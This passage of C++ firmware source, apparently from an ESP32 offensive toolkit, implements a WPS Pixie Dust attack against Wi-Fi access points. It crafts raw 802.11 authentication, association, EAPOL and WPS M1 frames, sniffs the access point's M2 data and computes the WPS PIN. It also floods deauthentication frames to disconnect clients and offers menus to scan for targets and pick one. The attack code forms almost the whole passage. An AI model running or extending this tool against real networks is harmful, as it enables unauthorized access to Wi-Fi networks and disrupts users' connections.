    putTlv(0x1008, configMethods,  sizeof(configMethods));  // Config Methods
    putTlv(0x1044, wifiProtected,  sizeof(wifiProtected));  // WPS State (FIX: was 0x103D)
    putTlv(0x1012, devPasswordId,  sizeof(devPassId));      // Device Password ID
    putTlv(0x103C, rfBands,        sizeof(rfBands));        // RF Bands
    putTlv(0x1002, assocState,     sizeof(assocState));     // Association State
    putTlv(0x1009, configError,    sizeof(configError));    // Config Error (FIX: was 0x1004)
    putTlv(0x102E, osVersion,      sizeof(osVersion));      // OS Version
    putTlv(0x1054, primaryDevType, sizeof(primaryDevType)); // Primary Device Type (FIX: was 0x103B)
    putTlv(0x1021, (const uint8_t*)manufacturer, (uint16_t)strlen(manufacturer)); // Manufacturer (FIX: was 0x1011)
    putTlv(0x1023, (const uint8_t*)modelName,    (uint16_t)strlen(modelName));    // Model Name (FIX: was 0x1021)
    putTlv(0x1024, (const uint8_t*)modelNumber,  (uint16_t)strlen(modelNumber));  // Model Number
    putTlv(0x1042, (const uint8_t*)serialNumber, (uint16_t)strlen(serialNumber)); // Serial Number
    putTlv(0x1011, (const uint8_t*)deviceName,   (uint16_t)strlen(deviceName));   // Device Name (FIX: was missing)
    putTlv(0x1049, osVendorExt,    sizeof(osVendorExt));    // Vendor Extension
    // Correct byte counts:
    // 802.11 QoS header:  26  (24 base + 2 QoS ctrl)
    // LLC/SNAP:            8
    // EAPOL header:        4  (version + type + body_len×2)
    // EAP header:          4  (code + id + eap_len×2)
    // EAP Expanded prefix: 10 (type=0xFE[1] + vendor-id[3] + vendor-type[4] + opcode[1] + flags[1])
    // WPS TLV body:        wp
    // WPS spec §7.7.1: first/only fragment MUST set Flags bit1 and include
    // a 2-byte Message Length field — without it TL-WR840N silently drops M1.
    int expandedPrefix = 12;  // 10 base + 2-byte Message Length field
    int eapBodyLen  = expandedPrefix + wp;
    uint16_t eapLen = (uint16_t)(4 + eapBodyLen);
    int totalLen    = 26 + 8 + 4 + eapLen;
    uint8_t *frame = (uint8_t*)malloc(totalLen);
    if (!frame) { free(wpsBody); *outLen = 0; return nullptr; }

    int pos = 0;
    // 802.11 QoS Data, ToDS=1
    frame[pos++]=0x88; frame[pos++]=0x01;
    frame[pos++]=0x2C; frame[pos++]=0x00;
    memcpy(frame+pos, apBssid,    6); pos+=6;  // addr1=BSSID
    memcpy(frame+pos, enrolleeMac,6); pos+=6;  // addr2=SA
    memcpy(frame+pos, apBssid,    6); pos+=6;  // addr3=DA
    { uint16_t sc=nextSeqCtrl(); frame[pos++]=sc&0xFF; frame[pos++]=(sc>>8)&0xFF; }
    frame[pos++]=0x00; frame[pos++]=0x00; // QoS control
    // LLC/SNAP
    frame[pos++]=0xAA; frame[pos++]=0xAA; frame[pos++]=0x03;
    frame[pos++]=0x00; frame[pos++]=0x00; frame[pos++]=0x00;
    frame[pos++]=0x88; frame[pos++]=0x8E;
    // EAPOL: version=1, type=0 (EAP), body length
    frame[pos++]=0x01; frame[pos++]=0x00;
    frame[pos++]=(eapLen>>8)&0xFF; frame[pos++]=eapLen&0xFF;
    // EAP header (4 bytes)
    frame[pos++]=0x02; frame[pos++]=eapId;
    frame[pos++]=(eapLen>>8)&0xFF; frame[pos++]=eapLen&0xFF;

    // EAP Expanded prefix (10 bytes):
    frame[pos++]=0xFE;                                        // type: Expanded
    frame[pos++]=0x00; frame[pos++]=0x37; frame[pos++]=0x2A; // WFA Vendor-ID
    frame[pos++]=0x00; frame[pos++]=0x00;
    frame[pos++]=0x00; frame[pos++]=0x01;                    // Vendor-Type
    frame[pos++]=0x04;                                        // Op-Code: WSC_MSG (M1)
    frame[pos++]=0x02;                                        // Flags: bit1=Message Length present
    frame[pos++]=(uint8_t)((wp>>8)&0xFF);                    // WPS Message Length hi
    frame[pos++]=(uint8_t)( wp    &0xFF);                    // WPS Message Length lo

    // WPS TLV body
    memcpy(frame+pos, wpsBody, wp); pos += wp;

    // Sanity check — catches future miscounts before free() does
    assert(pos == totalLen);
    free(wpsBody);

    *outLen = pos;
    return frame;
}

// ============================================================
// Active WPS exchange state machine
// ============================================================

enum class WpsProbeState : uint8_t {
    Idle,
    AuthSent,
    AssocSent,
    EapolStartSent,
    WaitingIdentityReq,
    IdentityRespSent,
    WaitingM2,    // WSC-Start received; sniffer is capturing M1/M2
    Done,
    Failed,
};

// Shared with sniffer via sniffer.h / wifi_wpspixie.h
PixieData pixieCapture;

// Internal state for the active probe
static volatile WpsProbeState g_wpsState       = WpsProbeState::Idle;
static volatile uint8_t       g_identityReqId  = 0;  // FIX: capture FIRST EAP-Req/Identity id, protect from retransmits
static volatile uint8_t       g_lastEapId      = 0;  // updated during M1/M2 phase, used for M1 id = lastEapId+1
static volatile bool          g_gotAuthResp    = false;
static volatile bool          g_gotAssocResp   = false;
static volatile bool          g_gotEapIdReq    = false;

// ============================================================
// Promiscuous callback used during the active probe.
// Watches for Auth/Assoc responses and EAP-Request/Identity.
// Also chains into the regular sniffer() for WPS TLV parsing.
// ============================================================
static void wpsProbeSnifferCb(void *buf, wifi_promiscuous_pkt_type_t type) {
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    if (!pkt) return;
    const uint8_t *p  = pkt->payload;
    const int      len = (int)pkt->rx_ctrl.sig_len;
    if (len < 10) return;

    // Only care about frames from our target AP (addr2 = transmitter)
    if (memcmp(p + 10, pixieCapture.bssid, 6) != 0) return;

    // 802.11 frame-control byte layout: bits[1:0]=version, bits[3:2]=type, bits[7:4]=subtype
    uint8_t fc_type    = (p[0] >> 2) & 0x03;  // 0=Mgmt, 1=Ctrl, 2=Data
    uint8_t fc_subtype = (p[0] >> 4) & 0x0F;



    // ---- Management frames: Auth and Assoc responses ----
    if (fc_type == 0x00) {
        if (len < 30) return; // all auth/assoc bodies need at least 6 bytes after the 24-byte header
        // Auth response: subtype 0x0B
        if (fc_subtype == 0x0B && g_wpsState == WpsProbeState::AuthSent) {
            // Auth body at byte 24: algorithm(2) + seq(2) + status(2)
            // Status is at p[28..29], little-endian
            uint16_t status = (uint16_t)p[28] | ((uint16_t)p[29] << 8);
            if (status == 0) {
                g_gotAuthResp = true;
                Serial.println("[WPS-Probe] Auth OK");
            } else {
                Serial.printf("[WPS-Probe] Auth rejected, status=%u\n", status);
            }
        }
        // Assoc response: subtype 0x01
        if (fc_subtype == 0x01 && g_wpsState == WpsProbeState::AssocSent) {
            // Assoc response body at byte 24: capability(2) + status(2) + AID(2)
            // Status is at p[26..27], little-endian
            uint16_t status = (uint16_t)p[26] | ((uint16_t)p[27] << 8);
            if (status == 0) {
                g_gotAssocResp = true;
                Serial.println("[WPS-Probe] Assoc OK");
            } else {
                Serial.printf("[WPS-Probe] Assoc rejected, status=%u\n", status);
            }
        }
        return;
    }

    // ---- Data frames: EAPOL / EAP / WPS ----
    if (fc_type == 0x02) {
        // QoS Data subtype adds 2 bytes of QoS Control after the base 24-byte header
        int hdrLen = 24 + (fc_subtype == 0x08 ? 2 : 0);
        if (hdrLen + 8 > len) return;

        // LLC/SNAP check
        if (p[hdrLen]   != 0xAA || p[hdrLen+1] != 0xAA || p[hdrLen+2] != 0x03) return;
        if (p[hdrLen+6] != 0x88 || p[hdrLen+7] != 0x8E) return; // must be EAPOL ethertype
        int offset = hdrLen + 8; // now at EAPOL header

        if (offset + 4 > len) return;
        uint8_t eapolType = p[offset + 1]; // EAPOL type: 0=EAP, 1=Start, 3=Key
        offset += 4; // past EAPOL header (version, type, length × 2)

        if (eapolType == 0x00 && offset + 5 <= len) { // EAP packet
            uint8_t eapCode = p[offset];     // 1=Request, 2=Response
            uint8_t eapId   = p[offset + 1];
            // EAP type is at offset+4 (after code, id, length×2)
            uint8_t eapType = (offset + 4 < len) ? p[offset + 4] : 0;

            if (eapCode == 0x01) { // EAP-Request from AP
                if (eapType == 0x01) {
                    // EAP-Request/Identity — update g_lastEapId on EVERY retransmit.
                    // The AP increments its EAP ID on each retransmit. We must echo
                    // back the LATEST id in our Identity Resp, not the first one seen.
                    // g_identityReqId is kept for diagnostics only.
                    if (!g_gotEapIdReq) {
                        g_identityReqId = eapId;
                        Serial.println("[WPS-Probe] Got EAP-Req/Identity");
                    }
                    g_lastEapId   = eapId;  // always track latest — used for Identity Resp
                    g_gotEapIdReq = true;
                }
                if (eapType == 0xFE) {
                    // EAP-Request/Expanded — detect WSC-Start.
                    // Update g_lastEapId here so Identity-Resp doesn't clobber it
                    // This AP uses three outer Vendor-ID formats:
                    //   00:37:2A — standard WFA; Op at wsOffset+7
                    //   2A:00:01 — double-wrap; inner OUI 37:2A:00 at wsOffset+9,
                    //              inner Op at wsOffset+9+7 = wsOffset+16
                    //   00:01:01 — WSC-Start shell; tiny 4-byte payload 37:2A:00:00,
                    //              no inner TLVs; ANY op on this outer vid = WSC-Start
                    int wsOffset = offset + 5; // right after EAP type byte (0xFE)
                    if (wsOffset + 3 > len) return;

                    bool isStdWfa    = (p[wsOffset]==0x00 && p[wsOffset+1]==0x37 && p[wsOffset+2]==0x2A);
                    bool isDblWrap   = (p[wsOffset]==0x2A && p[wsOffset+1]==0x00 && p[wsOffset+2]==0x01);
                    bool isShell     = (p[wsOffset]==0x00 && p[wsOffset+1]==0x01 && p[wsOffset+2]==0x01);
                    bool isTPLink = (wsOffset + 10 <= len && p[wsOffset+4] == 0x00 && p[wsOffset+5] == 0x37 && p[wsOffset+6] == 0x2A);

                    uint8_t opcode = 0;

                    if (isTPLink && wsOffset + 10 <= len) {
                        opcode = p[wsOffset + 9];
                    }

                    if (isStdWfa && wsOffset + 8 <= len) {
                        opcode = p[wsOffset + 7];  // VID(3)+VType(4) → Op
                    } else if (isDblWrap && wsOffset + 17 <= len) {
                        // inner: at wsOffset+9, OUI=37:2A:00, then VType-like(3), then Op
                        if (p[wsOffset+9]==0x37 && p[wsOffset+10]==0x2A && p[wsOffset+11]==0x00) {
                            opcode = p[wsOffset + 9 + 6]; // inner OUI(3)+VTypeLike(3) → Op
                        }
                    } else if (isShell) {
                        // Shell format: outer vid=00:01:01, outer op varies per retransmit,
                        // payload is always just 37:2A:00:00 — treat any of these as WSC-Start
                        opcode = 0x01; // normalise
                    }

                    // Accept op=0x01 (WSC_Start) or op=0x04 (WSC_MSG, some APs skip Start)
                    if ((isStdWfa || isDblWrap || isShell || isTPLink) &&
                        (opcode == 0x01 || opcode == 0x04)) {
                        if (g_wpsState == WpsProbeState::IdentityRespSent) {
                            Serial.printf("[WPS-Probe] WSC-Start (vid=%02X%02X%02X op=0x%02X%s)\n",
                                          p[wsOffset], p[wsOffset+1], p[wsOffset+2], opcode,
                                          isShell ? " shell" : isDblWrap ? " dbl-wrap" : "");
                            g_lastEapId = eapId;
                            g_wpsState  = WpsProbeState::WaitingM2;
                        } else if (g_wpsState == WpsProbeState::WaitingM2) {
                            // AP retransmitting WSC-Start — keep g_lastEapId current
                            // so the M1 retry loop always patches the freshest id+1.
                            g_lastEapId = eapId;
                        }
                    }
                }
            }
        }
    }
}

// ============================================================
// Send a raw frame via WIFI_IF_STA and wait for a state flag.
// ============================================================
static bool sendAndWait(const uint8_t *frame, int len,
                        volatile bool *flag, uint32_t timeoutMs) {
    *flag = false;
    for (int attempt = 0; attempt < 3; attempt++) {
        esp_wifi_80211_tx(WIFI_IF_STA, frame, len, true);
        uint32_t deadline = millis() + timeoutMs;
        while (millis() < deadline) {
            if (*flag) return true;
            vTaskDelay(pdMS_TO_TICKS(10));
        }
    }
    return false;
}

// ============================================================
// Active probe: one full attempt to initiate a WPS exchange.
// Returns true if pixieCapture.valid was set.
// ============================================================
static bool runActiveProbe(const String &/*tssid*/, uint8_t channel,
                           int &/*deauthCount*/, int &/*probeCount*/) {
    uint8_t *bssid    = pixieCapture.bssid;
    const char *ssid  = pixieCapture.essid;

    // Save old MAC, send teardown from it, THEN generate new MAC.
    {
        uint8_t prevMac[6];
        memcpy(prevMac, enrolleeMac, 6);
        uint8_t f[26];
        f[0]=0xC0; f[1]=0x00; f[2]=0x00; f[3]=0x00;
        memcpy(f+4, bssid, 6); memcpy(f+10, prevMac, 6); memcpy(f+16, bssid, 6);
        f[22]=0x10; f[23]=0x00; f[24]=0x03; f[25]=0x00;
        for (int i=0;i<5;i++) { esp_wifi_80211_tx(WIFI_IF_STA,f,26,true); vTaskDelay(pdMS_TO_TICKS(10)); }
        f[0]=0xA0;
        for (int i=0;i<5;i++) { esp_wifi_80211_tx(WIFI_IF_STA,f,26,true); vTaskDelay(pdMS_TO_TICKS(10)); }
        vTaskDelay(pdMS_TO_TICKS(400));
    }
    // ── Reset all probe state FIRST, before re-enabling promiscuous mode. ──
    // generateEnrolleeMac() calls set_promiscuous(true) which re-starts the
    // sniffer callback. If the AP is already sending Identity-Req frames during
    // the 400ms teardown delay, the callback will update g_lastEapId before the
    // reset block below — causing Identity Resp to use a stale id from the
    // previous attempt. Reset now, before any RX can arrive.
    g_wpsState      = WpsProbeState::Idle;
    g_identityReqId = 0;
    g_lastEapId     = 0;
    g_gotAuthResp   = false;
    g_gotAssocResp  = false;
    g_gotEapIdReq   = false;
    wps_reassembly_reset();

    // generateEnrolleeMac() must disable promiscuous mode to apply the new MAC to hardware.
    // After re-enabling we MUST re-register the RX callback — on ESP-IDF,
    // esp_wifi_set_promiscuous(false) clears the callback, so without this call
    // all subsequent Auth/Assoc/EAPOL frames are silently dropped.
    generateEnrolleeMac();
    {
        wifi_promiscuous_filter_t filt;
        filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
        esp_wifi_set_promiscuous_filter(&filt);
        esp_wifi_set_promiscuous(true);
        // Re-register the combined callback that was cleared by set_promiscuous(false).
        esp_wifi_set_promiscuous_rx_cb([](void *buf, wifi_promiscuous_pkt_type_t type) {
            wpsProbeSnifferCb(buf, type);
            sniffer(buf, type);
        });
    }
    vTaskDelay(pdMS_TO_TICKS(20));

    // Lock onto target channel
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    vTaskDelay(pdMS_TO_TICKS(50));

    uint8_t frameBuf[300];
    int flen;

    // ---- Clear any stale AP association from the previous attempt ----
    // If a prior probe left the AP's EAP/WPS state machine mid-exchange,
    // the AP will silently discard our new EAPOL-Start and never send
    // EAP-Request/Identity.  Sending Deauth + Disassoc from the *same*
    // enrollee MAC forces the AP to reset that station's state.
    // We do this BEFORE generating a new MAC so the AP can match the frame.
    {
        uint8_t clearBuf[30];
        int clen;
        clen = buildDeauthFrame(clearBuf, bssid);
        for (int i = 0; i < 3; i++) {
            esp_wifi_80211_tx(WIFI_IF_STA, clearBuf, clen, true);
            vTaskDelay(pdMS_TO_TICKS(10));
        }
        clen = buildDisassocFrame(clearBuf, bssid);
        for (int i = 0; i < 3; i++) {
            esp_wifi_80211_tx(WIFI_IF_STA, clearBuf, clen, true);
            vTaskDelay(pdMS_TO_TICKS(10));
        }
        vTaskDelay(pdMS_TO_TICKS(200)); // let the AP process the teardown
    }

    // Reset WPS fragment reassembly state for this fresh attempt
    wps_reassembly_reset();

    // ---- Auth ----
    flen = buildAuthFrame(frameBuf, bssid);
    g_wpsState = WpsProbeState::AuthSent;
    if (!sendAndWait(frameBuf, flen, &g_gotAuthResp, 800)) {
        Serial.println("[WPS-Probe] Auth timeout");
        return false;
    }
    vTaskDelay(pdMS_TO_TICKS(50));

    // ---- Association with WPS IE ----
    flen = buildAssocFrame(frameBuf, bssid, ssid, channel);
    g_wpsState = WpsProbeState::AssocSent;
    if (!sendAndWait(frameBuf, flen, &g_gotAssocResp, 1000)) {
        Serial.println("[WPS-Probe] Assoc timeout");
        return false;
    }
    vTaskDelay(pdMS_TO_TICKS(80));

    // ----EAPOL-Start (send 3× for reliability) ----
    flen = buildEapolStart(frameBuf, bssid);
    g_wpsState = WpsProbeState::EapolStartSent;
    for (int i = 0; i < 3; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, frameBuf, flen, true);
        vTaskDelay(pdMS_TO_TICKS(40));
    }
    g_wpsState = WpsProbeState::WaitingIdentityReq;

    // ---- Wait for EAP-Request/Identity ----
    {
        uint32_t deadline = millis() + 3000;
        while (!g_gotEapIdReq && millis() < deadline) vTaskDelay(pdMS_TO_TICKS(20));
        if (!g_gotEapIdReq) {
            Serial.println("[WPS-Probe] No EAP-Req/Identity");
            return false;
        }
    }
    vTaskDelay(pdMS_TO_TICKS(20));

    // Pre-build M1 NOW — buildM1Frame takes 300ms-1.5s (malloc+esp_random).
    // If built after WSC-Start, the AP retransmits WSC-Start with new EAP IDs
    // making our M1 carry a stale ID that the AP silently ignores.
    Serial.printf("[WPS-Probe] Building M1... t=%lums\n", millis());
    uint8_t pkeLocal[192], eNonceLocal[16];
    int m1Len = 0;
    uint8_t *m1Frame = buildM1Frame(bssid, 0x00, &m1Len, pkeLocal, eNonceLocal);
    if (!m1Frame) { Serial.println("[WPS-Probe] M1 alloc failed"); return false; }
    Serial.printf("[WPS-Probe] M1 built (%d bytes) t=%lums\n", m1Len, millis());
    memcpy(pixieCapture.pke,     pkeLocal,   192);
    memcpy(pixieCapture.e_nonce, eNonceLocal, 16);
    pixieCapture.pke_set = pixieCapture.e_nonce_set = true;

    // ---- EAP-Response/Identity ----
    flen = buildEapIdentityResponse(frameBuf, bssid, g_lastEapId);  // g_lastEapId = latest Identity Req id
    g_wpsState = WpsProbeState::IdentityRespSent;
    for (int i = 0; i < 3; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, frameBuf, flen, true);
        vTaskDelay(pdMS_TO_TICKS(40));
    }

    // ---- Wait for WSC-Start, then send M1, wait for M2 ----
    {
        // Step 1: wait for WSC-Start
        uint32_t deadline = millis() + 5000;
        bool gotWscStart = false;
        while (millis() < deadline) {
            if (g_wpsState == WpsProbeState::WaitingM2) { gotWscStart = true; break; }
            if (check(EscPress)) { free(m1Frame); return false; }
            vTaskDelay(pdMS_TO_TICKS(20));
        }
        if (!gotWscStart) {
            Serial.println("[WPS-Probe] WSC-Start timeout");
            free(m1Frame); return false;
        }
        Serial.printf("[WPS-Probe] WSC-Start received t=%lums\n", millis());

        // Settle: wait 350ms after first WSC-Start before sending M1.
        // The AP typically bursts 2-3 WSC-Start retransmits ~100ms apart.
        // Each one updates g_lastEapId (via the WaitingM2 branch above).
        // Waiting here ensures we capture the HIGHEST WSC-Start id so M1
        // goes out with the correct id+1, not an id from an earlier retransmit.
        // 350ms is enough for 3 retransmits at 100ms intervals without risking
        // the AP's session timeout (~5s on TP-Link / D-Link).
        vTaskDelay(pdMS_TO_TICKS(350));

        // Step 2: patch EAP ID in pre-built M1 and send.
        // WPS spec §7.1: after WSC-Start the enrollee sends M1 directly.
        // There is NO WSC-ACK step here — sending one causes the AP to
        // keep retransmitting WSC-Start and never process M1.
        //
        // Send M1, wait for M2, retransmit if needed.
        // Vendors vary widely: ASUS ~100ms, TP-Link ~150-300ms, D-Link up to 1s.
        // Re-patching EAP ID before each send handles AP WSC-Start retransmits.
        static const uint32_t M1_RETRY_INTERVAL_MS = 3000;
        static const int      M1_MAX_RETRIES        = 3;   // 4 sends = 12s total

        bool gotM2 = false;
        for (int attempt = 0; attempt <= M1_MAX_RETRIES && !gotM2; attempt++) {
            // Re-patch EAP ID immediately before each send.
            // The AP retransmits WSC-Start with incrementing IDs between our attempts.
            // g_lastEapId is updated by the sniffer on every WSC-Start retransmit,
            // so patching here ensures each M1 send uses the very latest id+1.
            m1Frame[39] = (uint8_t)(g_lastEapId + 1);
            if (attempt == 0) {
                Serial.printf("[WPS-Probe] Sending M1 (EAP ID=0x%02X) t=%lums\n",
                              m1Frame[39], millis());
            } else {
                Serial.printf("[WPS-Probe] M1 retransmit #%d (EAP ID=0x%02X) t=%lums\n",
                              attempt, m1Frame[39], millis());
            }
            esp_wifi_80211_tx(WIFI_IF_STA, m1Frame, m1Len, true);

            deadline = millis() + M1_RETRY_INTERVAL_MS;
            while (millis() < deadline) {
                if (pixieCapture.valid) { gotM2 = true; break; }
                if (check(EscPress))    { free(m1Frame); return false; }
                vTaskDelay(pdMS_TO_TICKS(50));
            }
        }
        free(m1Frame); m1Frame = nullptr;

        if (gotM2) {
            flen = buildEapNak(frameBuf, bssid, g_lastEapId);
            esp_wifi_80211_tx(WIFI_IF_STA, frameBuf, flen, true);
            return true;
        }
        Serial.println("[WPS-Probe] M2 timeout");
    }

    flen = buildEapNak(frameBuf, bssid, g_lastEapId);
    esp_wifi_80211_tx(WIFI_IF_STA, frameBuf, flen, true);
    vTaskDelay(pdMS_TO_TICKS(50));

    return pixieCapture.valid;
}

// ============================================================
// Screen drawing
// ============================================================

static void drawPixieScreen(const String &tssid, const String &mac,
                            uint8_t channel, int probeCount,
                            int deauthCount, bool timedOut) {
    drawMainBorderWithTitle("WPS Pixie Dust");
    String ssidDisp = tssid.length()>16 ? tssid.substring(0,15)+"~" : tssid;
    padprintln("AP:  " + ssidDisp);
    padprintln("MAC: " + mac);
    padprintln("Ch:  " + String(channel));

    auto tok = [](const char *label, bool got) -> String {
        return String(label) + (got?"[OK]":"[  ]") + " ";
    };
    padprintln(tok("PKE:", pixieCapture.pke_set) +
               tok("PKR:", pixieCapture.pkr_set));
    padprintln(tok("ENonce:", pixieCapture.e_nonce_set) +
               tok("RNonce:", pixieCapture.r_nonce_set));
    padprintln(tok("EH1:", pixieCapture.e_hash1_set) +
               tok("EH2:", pixieCapture.e_hash2_set) +
               tok("AK:",  pixieCapture.authkey_set));

    padprintln("Probes:" + String(probeCount) +
               " Deauths:" + String(deauthCount));

    if (timedOut)                padprintln("! Timeout");
    else if (pixieCapture.valid) padprintln(">>> CAPTURED! <<<");
    else                         padprintln("Probing AP...");

    tft.setTextSize(1);
    tft.drawString("Back=exit", 10, tftHeight-14);
}

// ============================================================
// Core attack loop
// ============================================================

static bool runCapture(const String &tssid, const String &mac,
                       uint8_t channel, bool preDeauth) {
    uint8_t bssid[6];
    sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &bssid[0],&bssid[1],&bssid[2],&bssid[3],&bssid[4],&bssid[5]);

    memset(&pixieCapture, 0, sizeof(pixieCapture));
    memcpy(pixieCapture.bssid, bssid, 6);
    strncpy(pixieCapture.essid, tssid.c_str(), sizeof(pixieCapture.essid)-1);
    wps_reassembly_reset(); // clear any leftover fragment state from last session

    memcpy(targetBssid, bssid, 6);
    memcpy(ap_record.bssid, bssid, 6);
    ap_record.primary = channel;
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    hsTracker = HandshakeTracker();
    num_EAPOL = 0;

    // Enable promiscuous mode with a filter that passes BOTH management AND
    // data frames.  Without WIFI_PROMIS_FILTER_MASK_MGMT the Auth/Assoc
    // responses from the AP are silently dropped and we never leave step 1.
    esp_wifi_set_promiscuous(true);
    wifi_promiscuous_filter_t filt;
    filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
    esp_wifi_set_promiscuous_filter(&filt);

    // Single combined callback: state machine first, then WPS TLV parser.
    esp_wifi_set_promiscuous_rx_cb([](void *buf, wifi_promiscuous_pkt_type_t type) {
        wpsProbeSnifferCb(buf, type);   // updates g_gotAuthResp / g_gotAssocResp / g_gotEapIdReq
        sniffer(buf, type);             // populates pixieCapture via parseWpsPixieData
    });

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    vTaskDelay(pdMS_TO_TICKS(150));

    const unsigned long TOTAL_TIMEOUT   = 90000; // 90 s per capture session
    const unsigned long DEAUTH_INTERVAL =  8000; // deauth every 8 s
    const unsigned long PROBE_INTERVAL  =  6000; // re-probe every 6 s (was 4 s; AP needs recovery time)

    unsigned long start      = millis();
    unsigned long lastDeauth = 0;
    unsigned long lastProbe  = 0;
    bool          captured   = false;
    bool          needRedraw = true;
    int           deauthCount = 0;
    int           probeCount  = 0;

    // Pre-burst deauth to clear any existing WPA sessions
    if (preDeauth) {
        drawMainBorderWithTitle("WPS Pixie Dust");
        padprintln("Clearing clients...");
        wsl_bypasser_send_raw_frame(&ap_record, channel, _default_target);
        for (int i = 0; i < 15; i++) {
            send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
            vTaskDelay(pdMS_TO_TICKS(10));
        }
        deauthCount += 15;
        vTaskDelay(pdMS_TO_TICKS(800));
    }

    drawPixieScreen(tssid, mac, channel, probeCount, deauthCount, false);

    while (millis() - start < TOTAL_TIMEOUT) {
        if (check(EscPress)) break;

        // Periodic deauth to keep WPA clients off while we probe WPS
        if (millis() - lastDeauth >= DEAUTH_INTERVAL) {
            wsl_bypasser_send_raw_frame(&ap_record, channel, _default_target);
            for (int i = 0; i < 5; i++) {
                send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
                vTaskDelay(pdMS_TO_TICKS(8));
            }
            deauthCount += 5;
            lastDeauth = millis();
            needRedraw = true;
            // Brief gap so the AP is ready before we probe
            vTaskDelay(pdMS_TO_TICKS(2000)); // was 1000ms; AP needs time to reset WPS state
        }

        // Active probe: initiate a WPS enrollee exchange
        if (millis() - lastProbe >= PROBE_INTERVAL && !pixieCapture.valid) {
            lastProbe = millis();
            needRedraw = true;
            drawPixieScreen(tssid, mac, channel, probeCount, deauthCount, false);
            runActiveProbe(tssid, channel, deauthCount, probeCount);
            probeCount++;
        }

        if (pixieCapture.valid) { captured = true; break; }

        if (needRedraw) {
            drawPixieScreen(tssid, mac, channel, probeCount, deauthCount, false);
            needRedraw = false;
        }

        vTaskDelay(pdMS_TO_TICKS(100));
    }

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    sniffer_wait_for_flush(1000);
    return captured;
}

// ============================================================
// WPS scan helpers
// ============================================================

bool hasWpsEnabled(int networkIndex) {
    return (WiFi.encryptionType(networkIndex) != WIFI_AUTH_WEP);
}

void wps_attack_menu() {
    resetGlobalState();
    if (!wifi_atk_setWifi()) return;

    drawMainBorderWithTitle("WPS Attacks");
    padprintln("Scanning...");

    int nets = WiFi.scanNetworks(false, showHiddenNetworks);
    options.clear();

    for (int i = 0; i < nets; i++) {
        if (!hasWpsEnabled(i)) continue;
        String ssid = WiFi.SSID(i);
        if (ssid.length() == 0) ssid = "<Hidden>";
        String capturedSsid = ssid;
        String capturedMac  = WiFi.BSSIDstr(i);
        uint8_t capturedCh  = (uint8_t)WiFi.channel(i);
        String label = capturedSsid + " Ch." + String(capturedCh);
        options.push_back({label.c_str(),
            [capturedSsid, capturedMac, capturedCh]() {
                wps_target_menu(capturedSsid, capturedMac, capturedCh);
            }
        });
    }

    if (options.empty()) {
        padprintln("No WPS networks found.");
        delay(2000);
    } else {
        options.push_back({"Back", [&]() { returnToMenu = true; }});
        loopOptions(options);
    }
    wifi_atk_unsetWifi();
}

void wps_target_menu(String tssid, String mac, uint8_t channel) {
AGAIN:
    options = {
        {"Information",
            [tssid, mac, channel]() { wifi_atk_info(tssid, mac, channel); }},
        {"WPS Pixie Dust",
            [tssid, mac, channel]() {
                wps_pixie_dust_attack(tssid, mac, channel, false);
            }},
        {"Deauth + Pixie",
            [tssid, mac, channel]() {
                wps_pixie_dust_attack(tssid, mac, channel, true);
            }},
        {"Back", [&]() { returnToMenu = true; }}
    };
    loopOptions(options);
    if (!returnToMenu) goto AGAIN;
}

// ============================================================
// Main entry point with retry loop
// ============================================================

void wps_pixie_dust_attack(String tssid, String mac, uint8_t channel, bool preDeauth) {
    resetGlobalState();
    cleanlyStopWebUiForWiFiFeature();

    // Full radio teardown so we start from a clean state
    wifi_complete_cleanup();
    delay(200);

    // Start in APSTA mode (needed for raw frame injection via WIFI_IF_STA
    // while still being able to run the promiscuous sniffer).
    if (!WiFi.mode(WIFI_MODE_APSTA)) {
        displayError("Failed starting WIFI", true);
        return;
    }
    vTaskDelay(pdMS_TO_TICKS(100));

    // Suppress the "BruceAttack" / "BruceNet" phantom AP.
    // WiFi.mode(APSTA) brings the AP interface up using whatever SSID was
    // last configured.  We immediately overwrite it with a hidden, zero-slot
    // softAP so nothing is broadcast — the AP interface just keeps the IDF
    // APSTA stack happy without advertising itself.
    WiFi.softAP("", "", 1, /*hidden=*/1, /*max_connection=*/0);
    vTaskDelay(pdMS_TO_TICKS(100));

    FS *fs    = nullptr;
    bool sdOk = setupSdCard();
    fs        = sdOk ? (FS*)&SD : (FS*)&LittleFS;
    isLittleFS = !sdOk;

    if (!sniffer_prepare_storage(fs, sdOk)) {
        displayError("Sniffer queue error", true);
        return;
    }

    for (;;) {
        bool captured = runCapture(tssid, mac, channel, preDeauth);
        preDeauth = false;

        drawPixieScreen(tssid, mac, channel, 0, 0, !captured);

        if (captured) {
            padprintln("[+] Captured!");
            savePixieData();
            padprintln("Solving...");
            String pin = runPixieDustCalculation(mac);

            if (pin.length() == 8) {
                padprintln("[+] PIN: " + pin);
            }

            // Always show MAC-based PINs as fallback / cross-check
            WpsPinGenerator gen;
            auto candidates = gen.getSuggestedPins(mac);
            if (!candidates.empty()) {
                padprintln("MAC PINs:");
                int shown = 0;
                for (const auto &c : candidates) {
                    if (c.pin == pin) continue;
                    padprintln(" " + c.pin + " " + c.name);
                    if (++shown >= 4) { padprintln(" ..."); break; }
                }
            }
            if (pin.length() != 8 && candidates.empty()) {
                padprintln("No PIN found.");
                padprintln("Use .pix + pixiewps.");
            }
        } else {
            padprintln("No data captured.");
            padprintln("AP may not support WPS");
            padprintln("or WPS is locked.");
        }

        padprintln("Retry? Sel=yes Esc=no");
        bool retry = false;
        for (;;) {
            if (check(SelPress)) { retry = true;  break; }
            if (check(EscPress)) { retry = false; break; }
            vTaskDelay(50);
        }
        if (!retry) break;
        resetGlobalState();
    }

    // Tear down the silent AP and restore normal radio state
    WiFi.softAPdisconnect(true);
    padprintln("Any key to exit...");
